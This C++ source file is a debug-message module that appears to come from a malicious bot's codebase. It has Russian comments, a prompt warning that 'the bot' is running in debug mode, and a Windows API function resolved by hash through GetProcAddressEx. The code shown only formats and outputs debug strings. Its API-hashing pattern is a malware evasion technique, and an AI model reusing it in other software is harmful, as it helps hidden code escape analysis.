//---------------------------------------------------------------------------


#include "GetApi.h"
#include "BotDebug.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"

//---------------------------------------------------------------------------

DWORD HandlerPID = 0;
LPVOID DebugMsgHandler = NULL;
TDebugMessageHandlerMethod DebugMsgHandlerHandlerMethod;

// Установить обработчик отладочных строк
void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
{
	IsNewProcess(HandlerPID);
	DebugMsgHandler = Handler;
    DebugMsgHandlerHandlerMethod = Method;
}

#ifdef DEBUGBOT

PCHAR StartDebugMSG = "Бот запущен в отладочном режиме! Продолжить?";

bool StartInDebugingMode(bool ShMSG)
{
	if (ShMSG)
	{
		int R = (int)pMessageBoxA(0, StartDebugMSG, NULL, MB_YESNO | MB_SERVICE_NOTIFICATION );
		if (R != IDYES)
			return false;
	}

	return true;
}

#endif

/* void DebugMessage(PCHAR Msg)
{
	// Вывести сообщение
	pMessageBoxA(0, Msg, NULL, MB_OK);
}
*/

void Debug::MessageEx(PCHAR Module, DWORD Line, PCHAR Section, PCHAR ExtData, PCHAR Str, ...)
{
	// Вызвать отладочное сообщение
	PCHAR FullLine = STR::Alloc(StrCalcLength(Str) + 4096);

	va_list Arguments;
	va_start(Arguments, Str);
	pwvsprintfA(FullLine, Str, Arguments);
	va_end(Arguments);


	if (IsNewProcess(HandlerPID))
	{
		DebugMsgHandler = NULL;
		DebugMsgHandlerHandlerMethod = NULL;
	}

	if (DebugMsgHandlerHandlerMethod != NULL)
	{
		DebugMsgHandlerHandlerMethod(DebugMsgHandler, Module, Line, Section, ExtData, FullLine);
		STR::Free(FullLine);
		return;
	}

	PCHAR ExtLine = STR::Alloc(STR::Length(FullLine) + 512);


	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _wsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7);

	_wsprintfA(ExtLine, "%s(%d) [ %s ] : %s", Module, Line, Section, FullLine);

	pOutputDebugStringA(ExtLine);
	STR::Free(FullLine);
    STR::Free(ExtLine);
}

void Debug::Message(PCHAR Module, PCHAR Str)
{
	MessageEx(Module, 0, NULL, NULL, Str);
}